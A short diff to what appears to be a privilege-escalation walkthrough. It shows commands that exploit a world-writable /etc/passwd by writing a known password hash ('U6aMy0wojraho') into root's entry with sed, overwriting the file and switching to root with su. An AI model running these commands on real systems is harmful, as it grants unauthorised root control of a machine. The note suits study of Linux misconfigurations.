@@ -31,15 +31,11 @@ ls -l /etc/passwd
 -rw-rw-rw- 1 root root <snip> /etc/passwd
 ```
 
-Remove x in the file means root requires no password anymore,
+`U6aMy0wojraho` : non password.
 
 ``` bash
-sed 's/root:x/root:/' /etc/passwd > /etc/passwd
-```
-
-Go to root
-
-``` bash
+sed 's/root:x:/root:U6aMy0wojraho:/' /etc/passwd > passwd
+cat passwd > /etc/passwd
 su
 ```
 
